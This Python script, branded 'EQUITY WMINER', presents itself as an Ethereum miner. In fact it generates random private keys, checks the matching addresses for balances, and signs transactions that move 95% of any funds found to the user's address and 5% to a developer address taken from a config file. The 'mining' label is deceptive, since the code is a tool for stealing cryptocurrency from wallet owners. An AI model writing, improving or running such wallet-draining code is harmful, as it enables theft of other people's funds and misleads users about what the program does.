import os
import sys
import time
import json
import string
import secrets
import requests
from web3 import Web3
import multiprocessing

def MineProcess(minerAddress, chk, hits, bdhits):
    w3 = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["CHECK_NODE"]))
    if w3.isConnected():
        i=0
        while i <= 1:
            key = "0x" + secrets.token_hex(32)
            try:
                account = w3.eth.account.from_key(key)
                bal = w3.eth.get_balance(account.address)
                if bal > 2000000000000000:
                    hits.value = hits.value + 1
                    w3 = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["RPC_NODE"]))
                    try:
                        print("\033[32m[NEW HIT] Succesfully cracked a wallet with following key: " + key + "\033[0m")
                        gasdata = requests.get(json.load(open("DATA", "r"))['MAIN']["GAS_API"]).text
                        gasjson = json.loads(gasdata)
                        avgGas = int(gasjson["average"])/10
                        MineTransaction = {
                            'nonce': w3.eth.getTransactionCount(account.address),
                            'to': str(minerAddress),
                            'value': w3.toWei((bal*0.95-(w3.toWei(avgGas, "gwei")*2)), "wei"),
                            'gas': 21000,
                            'gasPrice': w3.toWei(avgGas, "gwei")
                        }
                        MineTransaction2 = {
                            'nonce': w3.eth.getTransactionCount(account.address)+1,
                            'to': str(json.load(open("DATA", "r"))['SECONDARY']["DEV"]),
                            'value': w3.toWei((bal*0.05-(w3.toWei(avgGas, "gwei")*2)), "wei"),
                            'gas': 21000,
                            'gasPrice': w3.toWei(avgGas, "gwei")
                        }
                        signedMineTX = w3.eth.account.sign_transaction(MineTransaction, key)
                        sentMineTX = w3.eth.send_raw_transaction(signedMineTX.rawTransaction)
                        print("\033[32m" + str(bal*0.95/1000000000000000000) + " ETH has been sent to your wallet. TXHash: " + "https://etherscan.io/tx/" + str(w3.toHex(sentMineTX))+ "\033[0m")
                        time.sleep(80)
                        signedMineTX2 = w3.eth.account.sign_transaction(MineTransaction2, key)
                        if w3.toWei((bal*0.05-(w3.toWei(avgGas, "gwei")*2)), "wei") > w3.toWei(avgGas, "gwei"):
                            rt = w3.eth.send_raw_transaction(signedMineTX2.rawTransaction)
                    except Exception as e:
                        print(e)
                        print("[WARNING!] Automatically withdrawn failed! Awaiting for manual withdraw!")
                else:
                    print("\033[31m[BAD HIT] | " + str(account.address) + " | cracked but insufficient balance of " + str(bal/1000000000) + " ETH\033[0m")
                    bdhits.value = bdhits.value + 1
                    time.sleep(0.02)
            except Exception as e:
                print(e)
                print("\033[31m[BAD MATCH] | %s | Invalid key match for wallet\033[0m"%key)
                chk.value = chk.value + 1
                time.sleep(0.02)
    else: return print("CHILD PROCESS ENDED | Process Reallocated | Connection Failed to Web3 RPC Node")
def NUpdate(chk,hits,bdhits):
    x = 0
    while x < 1:
        if hits.value >= 1: sys.stdout.write("\x1b]2;EQUITY WMINER | MINING...GOT AN HIT! | CHKS: %s - HITS: %s - BDHITS: %s |\x07"%(chk.value, hits.value, bdhits.value))
        else: sys.stdout.write("\x1b]2;EQUITY WMINER | MINING... | CHKS: %s - HITS: %s - BDHITS: %s |\x07"%(chk.value, hits.value, bdhits.value))
        time.sleep(0.02)
if __name__=="__main__":
    os.system("cls")
    print("V 1.252")
    print('███████╗░██████╗░██╗░░░██╗██╗████████╗██╗░░░██╗  ░██╗░░░░░░░██╗░░░░░░███╗░░░███╗██╗███╗░░██╗███████╗██████╗░')
    print('██╔════╝██╔═══██╗██║░░░██║██║╚══██╔══╝╚██╗░██╔╝  ░██║░░██╗░░██║░░░░░░████╗░████║██║████╗░██║██╔════╝██╔══██╗')
    print('█████╗░░██║██╗██║██║░░░██║██║░░░██║░░░░╚████╔╝░  ░╚██╗████╗██╔╝█████╗██╔████╔██║██║██╔██╗██║█████╗░░██████╔╝')
    print('██╔══╝░░╚██████╔╝██║░░░██║██║░░░██║░░░░░╚██╔╝░░  ░░████╔═████║░╚════╝██║╚██╔╝██║██║██║╚████║██╔══╝░░██╔══██╗')
    print('███████╗░╚═██╔═╝░╚██████╔╝██║░░░██║░░░░░░██║░░░  ░░╚██╔╝░╚██╔╝░░░░░░░██║░╚═╝░██║██║██║░╚███║███████╗██║░░██║')
    print('╚══════╝░░░╚═╝░░░░╚═════╝░╚═╝░░░╚═╝░░░░░░╚═╝░░░  ░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░░░╚═╝╚═╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝')
    sys.stdout.write("\x1b]2;EQUITY WMINER | WAITING FOR INPUT | CHKS: 0 - HITS: 0 - BDHITS: 0 |\x07")
    print('\n')

    minerAddress = input("Welcome User! Enter your ETHEREUM address to start mining: ")
    if len(minerAddress) == 42:
        print("\033[32mMining address accepted!\033[0m")
        intensity = input("Please input desired CPU intensity for mining (1-100): ")
        if int(intensity) >= 1 and int(intensity) <= 100:
            print("\033[32mSelected %s as CPU intensity\033[0m"%str(intensity))
            print("Miner starting... [Buidling child processes...]")
            w3 = Web3(Web3.HTTPProvider(json.load(open("DATA", "r"))['MAIN']["RPC_NODE"]))
            time.sleep(1)
            if w3.isConnected():
                if __name__=="__main__":
                    chk = multiprocessing.Value("i", 0, lock=False)
                    hits = multiprocessing.Value("i", 0, lock=False)
                    bdhits = multiprocessing.Value("i", 0, lock=False)
                    updP = multiprocessing.Process(target=NUpdate, args=(chk,hits,bdhits,))
                    updP.start()
                    pcs = [multiprocessing.Process(target=MineProcess, args=(str(minerAddress),chk,hits,bdhits,)) for x in range(0, int(intensity)*2)]
                    print("Deploying child processes...\n")
                    [p.start() for p in pcs]
                    updP.join()
            else:
                print("\033[31mSomething went wrong...  RPC Connection Error. Are you connected to Internet?\033[0m")
        else:
            print("Not a valid number.")
            input("\nMiner stopped. Please restart.")
    else:
        print("That's not a valid ETHEREUM address!")
        input("\nMiner stopped. Please restart.")